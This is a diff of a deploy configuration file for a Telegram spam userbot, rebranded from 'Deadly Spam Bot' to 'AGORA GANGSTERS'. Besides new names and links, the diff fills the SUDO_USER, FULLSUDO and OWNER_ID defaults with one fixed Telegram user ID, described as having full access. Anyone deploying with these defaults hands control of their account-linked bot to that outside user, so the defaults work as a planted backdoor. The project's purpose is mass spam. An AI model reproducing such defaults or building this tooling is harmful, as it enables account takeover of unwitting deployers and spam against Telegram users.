@@ -1,20 +1,20 @@
 {
-      "name": "Deadly Spam Bot",
+      "name": "AGORA GANGSTERS",
       "description": "MOST POWERFUL + STABLE SPAM USERBOTS",
-      "logo": "",
+      "logo": "https://te.legra.ph/file/2cad74c2f0a59df589955.jpg",
       "keywords": [
         "telegram",
         "telethon",
         "telegram-bot",
-        "Deadly-spam-bot",
+        "Agora-Gangsters",
         "SpamBots"
       ],   
-  "repository": "https://github.com/Deadly-fighters",
-  "website": "https://github.com/Deadly-fighters",
-  "success_url": "https://t.me/deadly_userbot",
+  "repository": "https://github.com/AGORA-GANGSTERS",
+  "website": "https://github.com/AGORA-GANGSTERS",
+  "success_url": "https://t.me/AGORA_SPAM_OFFICIAL",
   "env": {
              "API_ID": {
-        "description": "Fill Api ID Take this value from My.telegram.org",
+        "description": "Fill Api ID Take this value from My.telegram.org/auth",
         "value": "",
         "required": true
       },
@@ -229,18 +229,18 @@
         "required": false
       },      
        "SUDO_USER": {
-            "description": "Sudo users id space by space or leave blank",
-            "value": "",
+            "description": "Sudo users id space by space or leave default",
+            "value": "5090542427",
             "required": false
      },
        "FULLSUDO": {
-            "description": "Full Sudo Users Id (This Sudo Users have All access of Spam Userbots",
-            "value": "",
+            "description": "Full Sudo Users Id (This Sudo Users have All access of Agora Gangsters",
+            "value": "5090542427",
             "required": false
         },
       "OWNER_ID": {
             "description": "Sudo users id space by space",
-            "value": "",
+            "value": "5090542427",
             "required": true
         },
       "CMD_HNDLR": {
